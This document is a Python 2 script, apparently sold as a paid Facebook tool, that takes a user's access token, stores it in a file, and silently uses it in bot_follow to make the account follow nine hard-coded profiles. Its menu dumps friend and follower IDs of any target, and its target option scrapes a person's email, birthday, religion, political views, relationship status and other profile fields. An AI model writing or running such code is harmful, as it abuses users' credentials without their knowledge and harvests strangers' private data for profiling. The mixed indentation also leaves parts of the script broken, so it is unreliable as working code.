#!/usr/bin/python2
#-*-coding:utf-8-*-

import os,re,sys,itertools,time,requests,random,threading,json,random
import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
    print("""   
\033[0;34m     █████  ███████ ███    ███ ██
\033[1;34m    ██   ██      ██ ████  ████ ██
\033[0;94m    ███████   ███   ██ ████ ██ ██
\033[1;94m    ██   ██ ██      ██  ██  ██ ██
\033[1;34m    ██   ██ ███████ ██      ██ ██
\n\x1b[1;96m-----------------------------------------------
\x1b[1;92m       AUTHOR    : AZMI
\x1b[1;92m       WHATSAPP  : MAI NAHI BATAOGI
\x1b[1;96m                 : THIS IS PAID TOOL
\x1b[1;96m-------- \x1b[1;93mXzee\x1b[1;96m ---------------------------------
""")
  
def login():
    os.system('clear')
    banner()
    toket = raw_input("\n[•] Token :› ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n[•] Login Successful')
        bot_follow()
    except KeyError:
        print ("\n[!] Token Invalid")
        os.system('clear')
        login()

def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)      #Bilal Haider
    	requests.post('https://graph.facebook.com/100023732631875/subscribers?access_token=' + toket)      #Nadeem gujjar
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah
        requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=' + toket) #Rizal F
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    	menu()

def menu():
        os.system("clear")
        banner()
	try:
	    	toket = open('login.txt','r').read()
	    	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    	a = json.loads(otw.text)
	    	nama = a['name']
	    	id = a['id']
	except Exception as e:
	    	print ("\n[•] Error : %s"%e)
	    	login()
    	print("  \x1b[1;92m[1] From Friend")
    	print("  \x1b[1;92m[2] From Public")
    	print("  \x1b[1;92m[3] From Followers")
    	print("  \x1b[1;92m[4] Get Data Target")
    	print("  \x1b[1;92m[0] Log Out")
    	print(" ")
    	r=raw_input("   \x1b[1;92m==> ")
    	if r=="":
	    print("\n[!] Fill In The Correct")
	    menu()
    	elif r=="1":
	    friend()
    	elif r=="2":
	    public()
    	elif r=="3":
	    followers()
	elif r=="4":
	    target()
    	elif r=="0":
		try:
			os.system('rm -rf login.txt')
			exit()
		except Exception as e:
			print("\n[!] Error File Not Found %s"%e)
    	else:
	    print ("\n[!] Wrong Input")
	    menu()	

def friend():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
                limit = raw_input("\n[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/me?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			friend()
		r=requests.get("https://graph.facebook.com/me?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+" | "+a['name'])
			ys.write(a['id']+" | "+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('  \x1b[1;92m[•] Sukses Dump ID From %s'%op['name'])
		print ("  \x1b[1;92m[•] Total ID : %s"%(len(id)))
		print ("  \x1b[1;92m[•] Output   : %s"%qq)
		raw_input("  \n\x1b[1;92m[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def public():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("    \n\x1b[1;93m[•] Put ID: ")
                limit = raw_input("[•] Limit (Max <1000>) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			public()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+" | "+a['name'])
			ys.write(a['id']+" | "+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('  \x1b[1;92m[•] Sukses Dump ID From %s'%op['name'])
		print ("  \x1b[1;92m[•] Total ID : %s"%(len(id)))
		print ("  \x1b[1;92m[•] Output   : %s"%qq)
		raw_input("  \n\x1b[1;92m[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def followers():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("    \n\x1b[1;93m[•] Put ID: ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			followers()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('  \x1b[1;92m[•] Sukses Dump ID From %s'%op['name'])
		print ("  \x1b[1;92m[•] Total ID : %s"%(len(id)))
		print ("  \x1b[1;92m[•] Output   : %s"%qq)
		raw_input("  \n\x1b[1;92m[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def target():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("    \n\x1b[1;93m[•] Put ID: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("  \x1b[1;92m[•] Name Account     : "+op["name"])
			print("  \x1b[1;92m[•] Username         : "+op["username"])
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Email            : "+op["email"])
			except KeyError:
				print("[•] Email            : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Date Of Birth    : "+op["birthday"])
			except KeyError:
				print("[•] Date Of Birth    : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Gender           : "+op["gender"])
			except KeyError:
				print("[•] Gender           : -")
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op['first_name']+'.json').replace(" ","_")
				ys = open(qq , 'w')
				for i in z['data']:
					id.append(i['id'])
					ys.write(i['id'])
				ys.close()
				print("[•] Total Friend     : %s"%(len(id)))
			except KeyError:
				print("[•] Total Friend     : -")
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op['first_name']+'.json').replace(" ","_")
				jw = open(bb , 'w')
				for c in b['data']:
					id.append(c['id'])
					jw.write(c['id'])
				jw.close()
				print("[•] Total Follower   : %s"%(len(id)))
			except KeyError:
				print("[•] Total Follower   : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Relationship     : "+op["relationship_status"])
			except KeyError:
				print("[•] Relationship     : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Religion         : "+op["religion"])
			except KeyError:
				print("[•] Religion         : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] About            : "+op["about"])
			except KeyError:
				print("[•] About            : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Interested In    : "+op["interested_in"])
			except KeyError:
				print("[•] Interested In    : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Political        : "+op["political"])
			except KeyError:
				print("[•] Political        : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Quotes           : "+op["quotes"])
			except KeyError:
				print("[•] Quotes           : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Website          : "+op["website"])
			except KeyError:
				print("[•] Website          : -")
			except IOError:
				print("[•] Website          : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Update Time      : "+op["updated_time"])
			except KeyError:
				print("[•] Update Time      : -")
			except IOError:
				print("[•] Update Time      : -")
			raw_input("\n[ Back ]")
			menu()
		except KeyError:
			raw_input("\n[ Back ]")
			menu()
	except Exception as e:
		exit("[•] Error : %s"%e)
		
if __name__=='__main__':
	menu()
